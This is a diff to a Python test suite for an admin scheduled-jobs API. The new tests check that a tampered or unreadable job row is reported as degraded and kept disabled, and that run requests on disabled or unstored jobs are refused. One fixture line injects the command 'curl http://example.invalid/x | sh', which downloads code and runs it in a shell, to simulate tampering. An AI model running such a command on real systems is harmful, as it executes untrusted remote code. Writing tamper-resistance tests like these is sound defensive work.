@@ -269,6 +269,40 @@ class TestListAdminJobs:
         assert resp.status_code == 200
         assert resp.json()["count"] == len(JOB_CATALOG)
 
+    def test_degraded_row_surfaces_degradation_and_hides_the_operators_choice(
+        self, client, registry
+    ):
+        """Gate #860, blocker 1, probe P5: an operator disables "tune",
+        then that one row's JSON goes bad (a stray field — a tamper, a
+        hand edit, or a newer build's field this build can't read). The
+        listing must say the store is degraded, must not claim "tune" is
+        a stored row, and — the actual promise that mattered — must never
+        show a concrete ``next_due_at`` for a job ``due-jobs`` will not
+        touch.
+        """
+        store = ScheduleStore(_schedule_path(registry))
+        store.put(ScheduledJob(name="tune", cadence="0 4 * * *", enabled=False))
+
+        path = _schedule_path(registry)
+        doc = json.loads(path.read_text())
+        for row in doc["jobs"]:
+            if row["name"] == "tune":
+                row["command"] = "curl http://example.invalid/x | sh"
+        path.write_text(json.dumps(doc), encoding="utf-8")
+
+        resp = client.get("/api/v1/admin/jobs")
+        assert resp.status_code == 200
+        body = resp.json()
+        assert body["store_degradation"] is not None
+
+        tune = next(j for j in body["jobs"] if j["name"] == "tune")
+        assert tune["stored"] is False
+        assert tune["next_due_at"] is None
+        # The fail-safe default for an unreadable row is disabled, never
+        # the schema's own `True` — showing "enabled" here would read as
+        # the operator's own choice, which this build cannot verify.
+        assert tune["enabled"] is False
+
 
 # ---------------------------------------------------------------------------
 # PATCH /admin/jobs/<name>
@@ -405,7 +439,10 @@ class TestRunAdminJob:
         resp = client.post("/api/v1/admin/jobs/not-a-real-job/run")
         assert resp.status_code == 404
 
-    def test_never_claims_synchronous_execution(self, client):
+    def test_never_claims_synchronous_execution(self, client, registry):
+        store = ScheduleStore(_schedule_path(registry))
+        store.put(ScheduledJob(name="tune", cadence="0 4 * * *", enabled=True))
+
         resp = client.post("/api/v1/admin/jobs/tune/run")
         assert resp.status_code == 200
         data = resp.json()
@@ -420,7 +457,7 @@ class TestRunAdminJob:
         store = ScheduleStore(_schedule_path(registry))
         store.put(
             ScheduledJob(
-                name="tune", cadence="0 4 * * *", enabled=False, timeout_seconds=77
+                name="tune", cadence="0 4 * * *", enabled=True, timeout_seconds=77
             )
         )
 
@@ -430,11 +467,48 @@ class TestRunAdminJob:
         reloaded = ScheduleStore(_schedule_path(registry)).get("tune")
         assert reloaded is not None
         assert reloaded.run_requested_at is not None
-        assert reloaded.enabled is False  # untouched
+        assert reloaded.enabled is True  # untouched
         assert reloaded.cadence == "0 4 * * *"  # untouched
         assert reloaded.timeout_seconds == 77  # untouched
 
+    def test_run_on_a_disabled_job_is_refused(self, client, registry):
+        """Blocker 2 (gate #860): a deferred run of a disabled job would be
+        a surprise spend once a dispatcher eventually picks it up, so this
+        refuses outright rather than accepting and running later."""
+        store = ScheduleStore(_schedule_path(registry))
+        store.put(
+            ScheduledJob(
+                name="tune", cadence="0 4 * * *", enabled=False, timeout_seconds=77
+            )
+        )
+
+        resp = client.post("/api/v1/admin/jobs/tune/run")
+        assert resp.status_code == 422
+        detail = resp.json()["detail"]
+        message = detail if isinstance(detail, str) else detail.get("message", detail)
+        assert "disabled" in str(message).lower()
+
+        # Nothing was written: the request never reached the store.
+        reloaded = ScheduleStore(_schedule_path(registry)).get("tune")
+        assert reloaded is not None
+        assert reloaded.run_requested_at is None
+
+    def test_run_on_a_never_stored_job_is_refused(self, client, registry):
+        """Blocker 2 / F1 (gate #860): run-now on a job with no stored row
+        must not silently enroll it into the catalog's default cadence."""
+        resp = client.post("/api/v1/admin/jobs/tune/run")
+        assert resp.status_code == 422
+        detail = resp.json()["detail"]
+        message = detail if isinstance(detail, str) else detail.get("message", detail)
+        assert "init-schedule" in str(message).lower()
+
+        # Nothing was written: no row was created at all.
+        assert ScheduleStore(_schedule_path(registry)).get("tune") is None
+
     def test_run_emits_job_run_requested_with_identity(self, client, registry):
+        store = ScheduleStore(_schedule_path(registry))
+        store.put(ScheduledJob(name="tune", cadence="0 4 * * *", enabled=True))
+
         resp = client.post("/api/v1/admin/jobs/tune/run")
         assert resp.status_code == 200
         events = registry.operational.event_log.get_events(
@@ -520,6 +594,8 @@ class TestPolicyDeny:
         """The policy is scoped to ``schedule.update``; ``run`` on the
         same job (a different operation) is untouched."""
         _deny_schedule(registry, "schedule.update")
+        store = ScheduleStore(_schedule_path(registry))
+        store.put(ScheduledJob(name="tune", cadence="0 4 * * *", enabled=True))
 
         resp = client.post("/api/v1/admin/jobs/tune/run")
 
